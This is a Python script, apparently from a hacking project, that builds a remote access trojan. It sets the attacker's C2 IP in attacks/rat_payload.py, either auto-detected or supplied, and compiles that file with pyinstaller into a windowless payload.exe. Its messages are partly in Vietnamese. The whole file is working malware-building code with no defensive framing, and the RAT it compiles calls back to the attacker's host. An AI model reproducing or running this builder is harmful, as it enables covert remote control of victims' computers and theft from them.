import os
import sys
import subprocess
import shutil
import socket
import argparse


def detect_active_ip():
    """Return the IPv4 address for the currently active default route."""
    try:
        # Most reliable for active Wi-Fi/Ethernet route on Windows/Linux
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.connect(("8.8.8.8", 80))
            return s.getsockname()[0]
    except OSError:
        pass

    try:
        hostname = socket.gethostname()
        return socket.gethostbyname(hostname)
    except OSError:
        return "127.0.0.1"


def update_rat_ip(hacker_ip):
    rat_file = os.path.join("attacks", "rat_payload.py")
    if not os.path.exists(rat_file):
        print(f"[-] Không tìm thấy file {rat_file}!")
        sys.exit(1)

    with open(rat_file, "r", encoding="utf-8") as f:
        lines = f.readlines()

    updated = False
    with open(rat_file, "w", encoding="utf-8") as f:
        for line in lines:
            if line.startswith("HACKER_IP = "):
                f.write(f'HACKER_IP = "{hacker_ip}"  # Updated automatically by build_payload.py\n')
                updated = True
            else:
                f.write(line)

    if not updated:
        print("[-] Không tìm thấy biến HACKER_IP trong attacks/rat_payload.py")
        sys.exit(1)

    print(f"[*] Đã cập nhật HACKER_IP = {hacker_ip} trong file rat_payload.py")


def build_payload():
    print(r"""
     ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄
    ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌
    ▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀█░▌ ▀▀▀▀█░█▀▀▀▀ 
    ▐░▌          ▐░▌       ▐░▌     ▐░▌     
    ▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄█░▌     ▐░▌     
    ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌     ▐░▌     
    ▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀█░█▀▀      ▐░▌     
    ▐░▌          ▐░▌     ▐░▌       ▐░▌     
    ▐░▌          ▐░▌      ▐░▌      ▐░▌     
    ▐░▌          ▐░▌       ▐░▌     ▐░▌     
     ▀            ▀         ▀       ▀      
    [*] RAT PAYLOAD BUILDER - BY ENI
    """)

    parser = argparse.ArgumentParser(description="Build a payload using the active LAN IP or a custom C2 IP.")
    parser.add_argument("--ip", dest="manual_ip", help="Optional IPv4 for the C2 server")
    args = parser.parse_args()

    current_ip = detect_active_ip()
    print(f"[*] Current active network IP detected: {current_ip}")

    if args.manual_ip:
        hacker_ip = args.manual_ip.strip()
        print(f"[*] Using provided C2 IP: {hacker_ip}")
    else:
        print(f"[*] Press Enter to use the detected IP: {current_ip}")
        hacker_ip = input("[?] Enter C2 IP (IPv4): ").strip()
        if not hacker_ip:
            hacker_ip = current_ip

    update_rat_ip(hacker_ip)

    print(f"\n[*] Building payload using target IP: {hacker_ip}")
    try:
        subprocess.run([
            "pyinstaller",
            "--onefile",
            "--noconsole",
            "attacks/rat_payload.py"
        ], check=True)
    except FileNotFoundError:
        print("[-] pyinstaller is not installed. Install it with: pip install pyinstaller")
        sys.exit(1)
    except subprocess.CalledProcessError:
        print("[-] Build failed. Please verify the Python environment and dependencies.")
        sys.exit(1)

    dist_exe = os.path.join("dist", "rat_payload.exe")
    target_exe = "payload.exe"

    if os.path.exists(dist_exe):
        if os.path.exists(target_exe):
            os.remove(target_exe)
        shutil.copy2(dist_exe, target_exe)
        print(f"[+] SUCCESS! payload.exe created at: {target_exe}")
        print(f"[+] The payload was compiled for C2 server IP: {hacker_ip}")
        print("[+] If the network changes, run this script again to rebuild the payload.")
    else:
        print("[-] No executable was generated in dist/. Build step failed.")
        sys.exit(1)


if __name__ == "__main__":
    build_payload()
